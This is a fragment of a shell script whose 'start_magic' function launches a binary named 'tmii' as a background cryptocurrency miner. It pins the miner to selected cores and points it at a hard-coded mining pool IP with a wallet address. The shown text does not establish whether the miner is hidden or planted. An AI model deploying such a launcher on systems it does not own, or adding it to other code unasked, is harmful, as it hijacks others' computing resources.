...
start_magic() {
  ...
  taskset -c $cores_to_use nohup ./tmii -a minotaurx --pool 45.115.225.71:8448 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
  local pid=$!
